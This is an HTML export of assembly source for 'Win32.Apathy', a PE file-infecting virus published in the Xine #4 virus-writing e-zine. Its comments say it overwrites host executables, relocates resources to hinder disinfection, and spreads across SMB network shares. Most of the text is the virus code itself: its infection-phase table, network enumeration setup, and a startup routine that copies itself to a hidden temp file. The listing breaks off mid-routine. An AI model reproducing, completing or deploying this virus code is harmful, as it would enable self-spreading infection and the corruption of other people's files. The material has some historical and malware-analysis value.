<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #4 - Phile 208 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                            - Win32.Apathy -</span><span class="sc0">
</span><span class="sc1">;                               -b0z0/iKX-</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  This is a PE infector that works in 9x/NT systems and infected files in</span><span class="sc0">
</span><span class="sc1">; that enviroments will work correctly after infection (I'm not sure that</span><span class="sc0">
</span><span class="sc1">; there is a secret bu... feature that could make them not to work).</span><span class="sc0">
</span><span class="sc1">; While infecting Win32.Apathy will overwrite the original PE start with</span><span class="sc0">
</span><span class="sc1">; a copy of itself, thus avoiding entirely the API searching problem,</span><span class="sc0">
</span><span class="sc1">; saving the original piece of code at the end of the infected file. To</span><span class="sc0">
</span><span class="sc1">; maintain compatibility with NT and to make disinfection a little tricky</span><span class="sc0">
</span><span class="sc1">; the virus will also change the .rsrc RVA and consequently all the resource</span><span class="sc0">
</span><span class="sc1">; entryes to some standard position. So just copying the original piece of</span><span class="sc0">
</span><span class="sc1">; will result in damaging the executable. The original file will be</span><span class="sc0">
</span><span class="sc1">; reconstructed in a temporary file and executed there as a new process.</span><span class="sc0">
</span><span class="sc1">; Check code for other things about the infection process and such.</span><span class="sc0">
</span><span class="sc1">; Win32.Apathy will also try to spread through the network (microsoft</span><span class="sc0">
</span><span class="sc1">; network or SMB or how you wanna call it) by scanning some connected</span><span class="sc0">
</span><span class="sc1">; resources and trying to infect files over there.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus has been quite tested under Win95/98/NT4</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Win32.Apathy born really a lot of time ago, I started coding this just</span><span class="sc0">
</span><span class="sc1">; after Xine#3 was out, but then the whole project (like all my other VX</span><span class="sc0">
</span><span class="sc1">; projects) was stopped until about december 1998 when I decided to finish</span><span class="sc0">
</span><span class="sc1">; at least something. The code tho is not optimized at all, could not be</span><span class="sc0">
</span><span class="sc1">; too clear in some parts, I just wanted to materialize a few ideas I had</span><span class="sc0">
</span><span class="sc1">; and I didn't really care too much to optimize or something this.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus name is quite obvious, but:</span><span class="sc0">
</span><span class="sc1">;     apathy: the state of having no wish to act and no enthusiasm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Thanx to StarZero for cool hints and notes!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; For any kind of info or something contact me at cl0wn@geocities.com</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc1">; kernel32 ones we need</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">SetFileAttributesA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">Sleep</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">GetTickCount</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">lstrcpy</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">SetFileTime</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">DeleteFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetTempPathA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetTempFileNameA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">CreateProcessA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">CopyFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">FindFirstFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">FindNextFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetCommandLineA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">ReadFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">HeapAlloc</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">GetProcessHeap</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">CreateFileMappingA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">MapViewOfFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">UnmapViewOfFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">CreateMutexA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">GetLastError</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc1">; for network from mpr.dll</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">WNetOpenEnumA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">WNetEnumResourceA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">vname</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'Win32.Apathy by '</span><span class="sc0">
</span><span class="sc5">author</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'-b0z0/iKX-'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; used as mutex object name</span><span class="sc0">

</span><span class="sc5">fsearch</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">f_attrib</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">f_ctime</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">f_atime</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">f_wtime</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">f_size_hi</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">f_size_lo</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">f_reserved</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">f_name</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">104h</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">f_alt_name</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eh</span><span class="sc0">     </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">msg</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'i am nobody except genetic runaround'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ff_handle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">f_handle</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">dotdot_mask</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">exemask</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">v_map_handle</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">v_file_handle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">orig_virus_p</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">pref</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ikx'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; tmp file name prefix</span><span class="sc0">

</span><span class="sc5">path_position</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_path</span><span class="sc0">

</span><span class="sc5">new_path</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">112h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; max_path + a bit more</span><span class="sc0">
</span><span class="sc5">tmp_name</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">112h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">process_info</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; STARTUPINFO structure for new process</span><span class="sc0">
</span><span class="sc5">startup_info</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">10h</span><span class="sc0">             </span><span class="sc1">; lenght of this structure</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">title_startup</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; pointer to title for console progs</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">has_infected</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; 00h no, 01h yes</span><span class="sc0">

</span><span class="sc5">virus_phase</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">07h</span><span class="sc0">             </span><span class="sc1">; 07h infecting .</span><span class="sc0">
                                        </span><span class="sc1">; 06h infecting windows directory</span><span class="sc0">
                                        </span><span class="sc1">; 05h infecting network 1 try</span><span class="sc0">
                                        </span><span class="sc1">; 04h infecting network 2 try</span><span class="sc0">
                                        </span><span class="sc1">; 03h infecting ..</span><span class="sc0">
                                        </span><span class="sc1">; 02h infecting network 3 try</span><span class="sc0">
                                        </span><span class="sc1">; 01h infecting network 4 try</span><span class="sc0">

</span><span class="sc5">netspace</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">4000h</span><span class="sc0">           </span><span class="sc1">; 16kb as suggested. place for 200h</span><span class="sc0">
                                        </span><span class="sc1">; entryes... way too much anyway</span><span class="sc0">

</span><span class="sc5">enum_handle</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; handle of Net enumeration</span><span class="sc0">
</span><span class="sc5">enum_count</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">1ffh</span><span class="sc0">            </span><span class="sc1">; how many got / how many to get</span><span class="sc0">
</span><span class="sc5">enum_size</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">netspace</span><span class="sc0">        </span><span class="sc1">; size of memory avaiable for results</span><span class="sc0">

</span><span class="sc5">r_point</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc1">; here begins the virus code</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc1">; equs</span><span class="sc0">
</span><span class="sc5">exesize</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1502h</span><span class="sc0">           </span><span class="sc1">; size of virus executable</span><span class="sc0">
</span><span class="sc5">pe_begin</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">100h</span><span class="sc0">           </span><span class="sc1">; where PE header begins in virus</span><span class="sc0">
</span><span class="sc5">file_align</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">200h</span><span class="sc0">           </span><span class="sc1">; file align value (= to linker one)</span><span class="sc0">
</span><span class="sc5">read_exe</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">4096d</span><span class="sc0">           </span><span class="sc1">; how much victim to read to check</span><span class="sc0">
</span><span class="sc5">marker</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'0z0b'</span><span class="sc0">          </span><span class="sc1">; infection marker</span><span class="sc0">
</span><span class="sc5">wait_time</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2604d</span><span class="sc0">           </span><span class="sc1">; time between each search</span><span class="sc0">
</span><span class="sc5">sleep_time</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">7919d</span><span class="sc0">           </span><span class="sc1">; add sleep time after good infection</span><span class="sc0">
</span><span class="sc5">f_shit</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2000h</span><span class="sc0">           </span><span class="sc1">; first gen dim</span><span class="sc0">
</span><span class="sc1">; the marker must be set at offset 58h of the PE once compiled</span><span class="sc0">

</span><span class="sc5">startcode</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetProcessHeap</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">exesize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">read_exe</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">netspace</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8h</span><span class="sc0">                      </span><span class="sc1">; zero memory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HeapAlloc</span><span class="sc0">               </span><span class="sc1">; allocate some memory from our heap</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_virus_p</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_path</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">112h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetTempPathA</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp_name</span><span class="sc0">     </span><span class="sc1">; create a temporary name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pref</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_path</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetTempFileNameA</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetCommandLineA</span><span class="sc0">     </span><span class="sc1">; get our name</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">22h</span><span class="sc0">      </span><span class="sc1">; " this is strange, sometimes cmdline</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_thatshit</span><span class="sc0">            </span><span class="sc1">; is enclosed in "", so we must take</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; care if they are there</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">find_ending</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">22h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">delete_ending_aswell</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_ending</span><span class="sc0">
</span><span class="sc5">delete_ending_aswell</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">not_thatshit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">title_startup</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">search_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">            </span><span class="sc1">; go to the extension</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">search_end</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">            </span><span class="sc1">; space</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_end</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">            </span><span class="sc1">; end of string</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">search_end</span><span class="sc0">
</span><span class="sc5">found_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; point on end of exe name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; copy possible command line options</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_path</span><span class="sc0">         </span><span class="sc1">; to the buffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lstrcpy</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; put null to open/copy it</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp_name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; copy ourselves to another name</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CopyFileA</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit_critical_temp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">02h</span><span class="sc0">                     </span><span class="sc1">; file attribute hidden</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp_name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetFileAttributesA</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0c0000000h</span><span class="sc0">              </span><span class="sc1">; readwrite</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp_name</span><span class="sc0">     </span><span class="sc1">; open the temporary file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileA</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; check if opened ok</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit_critical_temp</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">v_file_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileSize</span><span class="sc0">             </span><span class="sc1">; get size of file we are running from</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; copied in a tmp file</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; size</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; entire file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">
